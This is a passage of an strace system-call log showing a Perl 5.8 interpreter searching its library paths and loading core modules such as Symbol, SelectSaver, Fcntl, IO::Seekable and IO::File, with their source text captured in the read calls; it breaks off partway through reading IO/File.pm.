19001 12:57:07.384886 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384899 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384913 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384925 stat64("/usr/lib/perl5/Symbol.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384938 stat64("/usr/share/perl5/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384950 stat64("/usr/share/perl5/Symbol.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384964 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384976 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384990 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385003 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
19001 12:57:07.385024 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.385039 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.385050 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.385098 read(9, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
19001 12:57:07.385512 read(9, "", 4096) = 0
19001 12:57:07.385529 close(9)          = 0
19001 12:57:07.385604 stat64("/etc/perl/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385623 stat64("/etc/perl/SelectSaver.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385637 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385651 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385665 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385678 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385692 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385705 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385718 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385730 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385744 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385757 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385772 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.385784 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
19001 12:57:07.385806 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.385821 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.385833 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.385851 read(9, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
19001 12:57:07.385983 brk(0x81d6000)    = 0x81d6000
19001 12:57:07.386014 read(9, "", 4096) = 0
19001 12:57:07.386026 close(9)          = 0
19001 12:57:07.386483 read(7, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
19001 12:57:07.387122 read(7,  <unfinished ...>
18999 12:57:07.387143 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18999 12:57:07.387166 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18999 12:57:07.387182 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
18999 12:57:07.387194 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
18999 12:57:07.387207 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
18999 12:57:07.387221 waitpid(-1,  <unfinished ...>
19001 12:57:07.387232 <... read resumed> "", 4096) = 0
19001 12:57:07.387239 close(7)          = 0
19001 12:57:07.387281 stat64("/etc/perl/IO/Seekable.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387296 stat64("/etc/perl/IO/Seekable.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387311 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387324 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387339 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387352 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387366 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387378 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387392 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387404 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387417 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387431 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
19001 12:57:07.387453 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.387468 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.387480 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.387499 read(7, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
19001 12:57:07.387548 stat64("/etc/perl/Fcntl.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387548 stat64("/etc/perl/Fcntl.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387548 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387549 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387549 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387549 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387549 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387550 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387550 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387550 stat64("/usr/share/perl5/Fcntl.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387550 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.387550 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
19001 12:57:07.387551 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.387551 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.387556 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.387576 read(9, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
19001 12:57:07.387983 brk(0x81f7000)    = 0x81f7000
19001 12:57:07.388230 read(9, "", 4096) = 0
19001 12:57:07.388245 close(9)          = 0
19001 12:57:07.388318 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
19001 12:57:07.388344 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
19001 12:57:07.388372 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 9
19001 12:57:07.388387 read(9, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
19001 12:57:07.388480 fstat64(9, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
19001 12:57:07.388498 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 9, 0) = 0xb7cf6000
19001 12:57:07.388512 mmap2(0xb7cf9000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 9, 0x2) = 0xb7cf9000
19001 12:57:07.388528 close(9)          = 0
19001 12:57:07.388805 read(7, "", 4096) = 0
19001 12:57:07.407527 close(7)          = 0
19001 12:57:07.407527 stat64("/etc/perl/IO/File.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407528 stat64("/etc/perl/IO/File.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407528 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407528 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407528 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407529 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407529 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407529 stat64("/usr/lib/perl5/IO/File.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407529 stat64("/usr/share/perl5/IO/File.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407529 stat64("/usr/share/perl5/IO/File.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407530 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.407530 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
19001 12:57:07.407530 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.407530 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.407539 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.407558 read(7, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    